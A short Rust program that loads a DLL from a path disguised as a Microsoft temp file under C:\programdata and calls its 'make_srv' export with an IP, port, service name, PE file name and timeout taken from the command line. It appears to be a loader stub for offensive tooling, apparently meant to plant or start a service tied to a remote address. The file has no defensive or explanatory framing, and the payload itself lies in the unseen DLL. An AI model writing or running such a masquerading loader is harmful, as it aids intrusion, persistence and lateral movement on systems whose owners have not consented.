#![allow(non_snake_case)]
#![allow(unused_variables)]
use libloading::{Library, Symbol};
use std::env;

fn main() {
    unsafe {
        // https://docs.rs/libloading/latest/libloading/index.html

        let args: Vec<String> = env::args().collect();
        let IP = args[1].clone();
        let PORT = args[2].clone();
        let ServiceName = args[3].clone();
        let PEName = args[4].clone();
        let Timeout = args[5].clone();

        let hands: bool;
        let lib = Library::new("C:\\programdata\\MicrosoftW\\windows_Win32_Temp.dll").unwrap();
        let func: Symbol<unsafe extern "C" fn(String, String, String, String, String) -> u32> =
            lib.get(b"make_srv").unwrap();
        func(IP, PORT, ServiceName, PEName, Timeout);
    }
}
